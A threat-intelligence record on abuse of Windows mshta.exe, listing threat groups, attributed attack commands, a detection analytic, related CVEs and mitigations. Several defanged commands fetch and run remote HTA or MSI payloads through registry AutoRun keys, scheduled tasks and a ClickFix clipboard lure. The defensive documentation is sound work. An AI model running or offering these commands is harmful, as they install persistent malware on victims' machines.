name: mshta.exe
description: Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.
summary: Download and execute applications from a remote server

attack_relationships.description: APT29 has use `mshta` to execute malicious scripts on a compromised host.
APT32 has used mshta.exe for code execution.
APT38 has used a renamed version of `mshta.exe` to execute malicious HTML files.
APT38 has renamed system utilities, such as `rundll32.exe` and `mshta.exe`, to avoid detection.
Confucius has used mshta.exe to execute malicious VBScript.
Earth Lusca has used `mshta.exe` to load an HTA script within a malicious.LNK file.
FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.
Gamaredon Group has used `mshta.exe` to execute malicious files.
Gamaredon Group has used various legitimate tools, such as `mshta.exe` and Reg, and services during operations.
Inception has used malicious HTA files to drop and execute malware.
Kimsuky has used mshta.exe to run malicious scripts on the system.
Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents.
Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe.
LazyScripter has used `mshta.exe` to execute Koadic stagers.
MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.
Mustang Panda has used mshta.exe to launch collection scripts.
SideCopy has utilized `mshta.exe` to execute a malicious hta file.
SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling `mshta.exe`.
Sidewinder has used mshta.exe to execute malicious payloads.
TA2541 has used `mshta` to execute scripts including VBS.
TA551 has used mshta.exe to execute malicious payloads.
During C0015, the threat actors used `mshta` to execute DLLs.
During Operation Dust Storm, the threat actors executed JavaScript code via `mshta.exe`.
BabyShark has used mshta.exe to download and execute applications from a remote server.
Lumma Stealer has used mshta.exe to execute additional content.
Metamorfo has used mshta.exe to execute a HTA payload.
NanHaiShu uses mshta.exe to load its program and files.
POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.
Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.
Revenge RAT uses mshta.exe to run malicious scripts on the system.
Sibot has been executed via MSHTA application.
Xbash can use mshta for executing scripts.
Covenant can create HTA files to install Grunt listeners.
Koadic can use mshta to serve additional payloads and to help schedule tasks for persistence.

associated_commands.intent: Persistence: BabyShark's AutoRun value runs mshta to fetch a remote HTA whenever cmd.exe starts, and scheduled tasks make sure cmd.exe is launched.
associated_commands.source_name: Unit 42 BabyShark February 2019

associated_commands.command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "powershell.exe start-process -windowstyle hidden -filepath mshta.exe hxxps://bit-albania[.]com/[REDACTED]/Drfwj.hta" /f
associated_commands.intent: Persistence: set cmd.exe's AutoRun so the BabyShark second-stage HTA downloader runs whenever cmd.exe starts.
associated_commands.source_name: Crowdstrike GTR2020 Mar 2020

associated_commands.command: Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} "C:\WINDOWS\system32\schtasks.exe" /create /TN AutomaticChromeUpdater /TR "mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate" /SC minute /mo 60
associated_commands.intent: Koadic persistence: a scheduled task named AutomaticChromeUpdater runs mshta against the attacker's server every 60 minutes.
associated_commands.source_name: Malwarebytes LazyScripter February 2021

associated_commands.intent: Periodic beacon to the attacker's server, run by a VBS file that a scheduled task starts every 20 minutes.
associated_commands.source_name: Qualys LolZarus Lazarus Group February 2022

associated_commands.intent: Execution of Koadic: the intruders used an mshta launcher with JavaScript, and the two executions created child processes that loaded stage 2 into memory.
associated_commands.source_name: The DFIR Report PYSA Mespinoza Ransomware November 2020

associated_commands.intent: Persistence: Koadic scheduled a task that runs a HTA file from C:\ProgramData at logon as SYSTEM, which starts C2 back to the Koadic server.
associated_commands.source_name: The DFIR Report PYSA Mespinoza Ransomware November 2020

associated_commands.command: schtasks /create /sc MINUTE /tn "Windows Error Reporting" /tr "mshta.exe about:'<script language=\"vbscript\" src=\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\">code close</script>'" /mo 15 /F
associated_commands.intent: Scheduled task created by the spear-phishing macro that runs mshta every 15 minutes to download another payload (a script disguised as a .jpg) from the C&C server.
associated_commands.source_name: Cybereason Operation Cobalt Kitty May 2017

associated_commands.intent: After the user opened the fake invoice document attachment, it ran mshta against a remote HTA that executed a PowerShell script, which downloaded and executed the FormBook information stealer.
associated_commands.source_name: Unit 42 CVE-2017-11882 Exploit in the Wild December 2017

associated_commands.intent: Alternative infection method seen in telemetry: mshta launched from the ezPDFReader folder path to fetch an HTA payload from a compromised website.
associated_commands.source_name: Kaspersky Andariel Evolves to Target South Korea with Ransomware June 2021

associated_commands.intent: Execution of an HTA file hosted on a remote server by abusing mshta.exe via depended.exe.
associated_commands.source_name: Symantec Shuckworm Continues Cyber-Espionage Attacks Against Ukraine January 2022

associated_commands.intent: The MediaConvertor.dat script searches for removable drives and creates a .lnk file on them with this command.
associated_commands.source_name: Symantec Shuckworm Continues Cyber-Espionage Attacks Against Ukraine January 2022

associated_commands.intent: After the infection started from an LNK file on an external drive, explorer.exe launched mshta.exe to run JavaScript that opens the files folder and runs the obfuscated ~.drv VBScript, which creates two files and executes them.
associated_commands.source_name: Symantec Shuckworm GammaSteel April 2025

associated_commands.intent: The LNK files executed mshta.exe to download and parse a remote XML file, which executes a malicious PowerShell script.
associated_commands.source_name: Cisco Talos Gamaredon APT Targets Ukrainian Government Agencies September 2022

associated_commands.intent: To execute HRSword.exe while disabling EDR, the attackers ran a batch file with administrator privileges using VBScript via mshta with the runas option in ShellExecute.
associated_commands.source_name: Cisco Talos Uncovering Qilin Attack Methods October 2025

associated_commands.intent: Observed HTA abuse that reads a binary object from a registry key with regread() and evals it, which then starts a PowerShell child process that runs a script with iex (consistent with Poweliks or Win32/Xswkit).
associated_commands.source_name: Red Canary Microsoft HTML Application HTA Abuse Part Deux August 2015

associated_commands.intent: LNK parameters used forfiles.exe to run PowerShell, which retrieved a second-stage payload from a remote URL and executed it via mshta.exe.
associated_commands.source_name: Mandiant PEAKLIGHT Memory-Only Dropper August 2024

associated_commands.intent: ClickFix command copied to the clipboard (Run dialog paste) that uses mshta.exe to execute a JScript payload, the first stage of a chain ending in the steganographic Stego Loader and stealers.
associated_commands.source_name: Huntress ClickFix Malware Buried in Images November 2025

associated_commands.intent: Malicious command passed to navigator.clipboard.writeText() by the fake Windows Update ClickFix page, starting the same mshta.exe to PowerShell to Stego Loader chain.
associated_commands.source_name: Huntress ClickFix Malware Buried in Images November 2025

associated_commands.command: mshta[.]exe hxxps[://]buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com/dir/sixth/singl6[.]mp4 #  ✅ ''I am not a robot - reCAPTCHA Verification ID: 2165
associated_commands.intent: Emmenhtal Loader ClickFix lure: the page copies this command to the clipboard, the victim pastes it in the Run dialog, and explorer.exe launches mshta.exe to fetch a remote HTA.
associated_commands.source_name: Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026

associated_commands.command: mshta.exe vbscript:createobject("wscript.shell").run("Cmd /c for /d %i in (195[.]189[.]28[.]244:17807 103[.]124[.]106[.]194:18413 58[.]221[.]59[.]20:17256 ) do Msiexec /i hxxp://%i/3EBCE3A4.Png /Q",0)(window.close)
associated_commands.intent: PurpleFox delivery method: launch msiexec from an MSHTA command line to download and execute an MSI package disguised as a .png file.
associated_commands.source_name: Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026

associated_commands.intent: MSHTA creates a wscript shell that runs PowerShell to download and execute a script in memory; the URL looks like an image, and the PowerShell keywords are split to bypass detection (IPs typically used by XWorm/Danabot).
associated_commands.source_name: Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026

associated_commands.intent: Lalala information stealer chain: MSHTA runs PowerShell that fetches the next script from a PHP gate, which serves it only when the POST body contains a predefined password.
associated_commands.source_name: Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026

associated_commands.intent: The attacker ran mshta.exe through cmd.exe from the MS-SQL process; the URL argument made mshta download and execute a malicious HTA that fetches the Cobalt Strike stager XSL script.
associated_commands.source_name: AhnLab ASEC Cobalt Strike Being Distributed to Unsecured MS-SQL Servers (2) February 2022

attack_detection_strategies.name: Detecting Mshta-based Proxy Execution via Suspicious HTA or Script Invocation

analytics.description: Detection of mshta.exe execution where command-line arguments reference remote or local HTA/script content (VBScript/JScript) followed by subsequent file creation, network retrieval, or process spawning that indicates payload execution outside standard Internet Explorer security context. Correlation includes parent process lineage, command-line inspection, and network connection creation to untrusted or anomalous endpoints.

related_CVE.description: Microsoft Office/WordPad remote code execution through a crafted document. Exploitation makes Word fetch a remote HTA file, which the application/hta handler runs through mshta.exe.
Microsoft Office Equation Editor memory corruption (remote code execution). In an XWorm phishing campaign, Excel files exploiting it downloaded an HTA file whose JScript runs under mshta.exe.

Microsoft Office Equation Editor memory corruption (remote code execution). Documents exploiting it in the wild commonly ran mshta.exe to execute a remote HTA or script, for example mshta hxxps://zilk[.]pw/url/index.hta.

references.source_name: Unit 42 CVE-2017-11882 in the wild December 2017

mitigations.name: Execution Prevention
mitigations.description: Use application control configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the mshta.exe application and to prevent abuse.

mitigations.name: Disable or Remove Feature or Program
mitigations.description: Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.
